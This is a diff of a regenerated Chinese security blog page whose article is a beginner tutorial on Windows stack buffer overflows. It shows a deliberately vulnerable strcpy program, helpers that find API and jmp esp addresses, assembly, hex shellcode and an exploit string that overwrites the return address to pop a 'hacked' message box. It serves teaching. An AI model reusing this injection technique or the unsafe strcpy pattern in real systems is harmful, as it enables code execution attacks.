@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="概念知识点 在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方1.数据在指令中直接给出2.数据在寄存器中3.数据在内存中漏洞利用原理简介本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，x">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="windows栈溢出入门">
 <meta property="og:url" content="http://kevien.github.io/2017/08/02/windows栈溢出入门/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="概念知识点 在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方1.数据在指令中直接给出2.数据在寄存器中3.数据在内存中漏洞利用原理简介本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，x">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2017/08/02/windows栈溢出入门/1.png">
 <meta property="og:updated_time" content="2018-03-31T16:03:02.000Z">
 <meta name="twitter:card" content="summary">
@@ -144,7 +144,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2017/08/02/windows栈溢出入门/"/>
+  <link rel="canonical" href="http://kevien.github.io/2017/08/02/windows栈溢出入门/">
 
 
 
@@ -153,7 +153,7 @@
   <title>windows栈溢出入门 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -178,13 +178,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -214,7 +214,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -224,7 +224,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -234,7 +234,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -244,7 +244,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -254,7 +254,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -267,7 +267,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -288,9 +288,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -322,16 +320,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/02/windows栈溢出入门/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -426,21 +424,21 @@
 
       
         <h4 id="概念知识点"><a href="#概念知识点" class="headerlink" title="概念知识点"></a>概念知识点</h4><ul>
-<li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char buffer[8];</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">	strcpy(buffer,name);</span><br><span class="line">	printf(&quot;%s\n&quot;,buffer);</span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出弹出一个MessageBox的框</p>
-<h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE LibHandle;</div><div class="line">	MYPROC ProcAdd;</div><div class="line">	LibHandle = LoadLibrary(&quot;kernel32&quot;);</div><div class="line">	//LibHandle = LoadLibrary(&quot;user32&quot;);</div><div class="line">	printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</div><div class="line">	ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</div><div class="line">	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</div><div class="line">	printf(&quot;system = //x%x\n&quot;,ProcAdd);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;stdlib.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">		BYTE *ptr;</div><div class="line">		int position;</div><div class="line">		HINSTANCE handle;</div><div class="line">		BOOL done_flag = FALSE;</div><div class="line">		handle = LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">		if(!handle)</div><div class="line">		&#123;</div><div class="line">			printf(&quot;Load dll error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">		for(position = 0; !done_flag; position++ )</div><div class="line">		&#123;</div><div class="line">			try</div><div class="line">			&#123;</div><div class="line">				if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</div><div class="line">				&#123;</div><div class="line">					int address = (int)ptr + position;</div><div class="line">					printf(&quot;OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			catch(...)</div><div class="line">			&#123;</div><div class="line">				int address = (int)ptr + position;</div><div class="line">				printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				done_flag = true;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	_asm&#123;</div><div class="line">		sub esp,0x50</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx</div><div class="line">		push 0x20676e69</div><div class="line">		push 0x6e726157  //push &quot;Warning&quot;</div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</div><div class="line">		push 0x6b72304d</div><div class="line">		push 0x20796220</div><div class="line">		push 0x64656b63</div><div class="line">		push 0x6168206e</div><div class="line">		push 0x65656220</div><div class="line">		push 0x65766168</div><div class="line">		push 0x20756f79</div><div class="line">		mov ecx,esp</div><div class="line">			</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push ecx</div><div class="line">		push ebx</div><div class="line">		mov eax,0x761aea99</div><div class="line">		call eax</div><div class="line">		push ebx</div><div class="line">		mov eax,0x7700be52</div><div class="line">        call eax</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="external">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="external">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">83EC 50</div><div class="line">33DB</div><div class="line">53</div><div class="line">68 696E6720</div><div class="line">68 5761726E</div><div class="line">8BC4</div><div class="line">53</div><div class="line">68 21202020</div><div class="line">68 4D30726B</div><div class="line">68 20627920</div><div class="line">68 636B6564</div><div class="line">68 6E206861</div><div class="line">68 20626565</div><div class="line">68 68617665</div><div class="line">68 796F7520</div><div class="line">8BCC</div><div class="line">53</div><div class="line">50</div><div class="line">51</div><div class="line">53</div><div class="line">B8 99EA1A76</div><div class="line">FFD0</div><div class="line">53</div><div class="line">B8 52BE0077</div><div class="line">FFD0</div></pre></td></tr></table></figure></p>
-<p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&quot;\x83\xEC\x50&quot;</div><div class="line">  &quot;\x33\xDB&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">  &quot;\x8B\xC4&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">  &quot;\x8B\xCC&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x50&quot;</div><div class="line">  &quot;\x51&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">  &quot;\xFF\xD0&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">  &quot;\xFF\xD0&quot;;</div></pre></td></tr></table></figure></p>
-<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</div><div class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</div><div class="line">			  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</div><div class="line">			  &quot;\x83\xEC\x50&quot;</div><div class="line">			  &quot;\x33\xDB&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">			  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">			  &quot;\x8B\xC4&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">			  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">			  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">			  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">			  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">			  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">			  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">			  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">			  &quot;\x8B\xCC&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x50&quot;</div><div class="line">			  &quot;\x51&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">typedef void (*MYPROC)(LPTSTR);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC ProcAdd;</span><br><span class="line">	LibHandle = LoadLibrary(&quot;kernel32&quot;);</span><br><span class="line">	//LibHandle = LoadLibrary(&quot;user32&quot;);</span><br><span class="line">	printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</span><br><span class="line">	ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</span><br><span class="line">	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</span><br><span class="line">	printf(&quot;system = //x%x\n&quot;,ProcAdd);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">		BYTE *ptr;</span><br><span class="line">		int position;</span><br><span class="line">		HINSTANCE handle;</span><br><span class="line">		BOOL done_flag = FALSE;</span><br><span class="line">		handle = LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">		if(!handle)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Load dll error&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">		ptr = (BYTE*)handle;</span><br><span class="line"></span><br><span class="line">		for(position = 0; !done_flag; position++ )</span><br><span class="line">		&#123;</span><br><span class="line">			try</span><br><span class="line">			&#123;</span><br><span class="line">				if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</span><br><span class="line">				&#123;</span><br><span class="line">					int address = (int)ptr + position;</span><br><span class="line">					printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			catch(...)</span><br><span class="line">			&#123;</span><br><span class="line">				int address = (int)ptr + position;</span><br><span class="line">				printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">				done_flag = true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	_asm&#123;</span><br><span class="line">		sub esp,0x50</span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push 0x20676e69</span><br><span class="line">		push 0x6e726157  //push &quot;Warning&quot;</span><br><span class="line">		mov eax,esp</span><br><span class="line">		push ebx</span><br><span class="line">		push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</span><br><span class="line">		push 0x6b72304d</span><br><span class="line">		push 0x20796220</span><br><span class="line">		push 0x64656b63</span><br><span class="line">		push 0x6168206e</span><br><span class="line">		push 0x65656220</span><br><span class="line">		push 0x65766168</span><br><span class="line">		push 0x20756f79</span><br><span class="line">		mov ecx,esp</span><br><span class="line">			</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push ecx</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x761aea99</span><br><span class="line">		call eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x7700be52</span><br><span class="line">        call eax</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
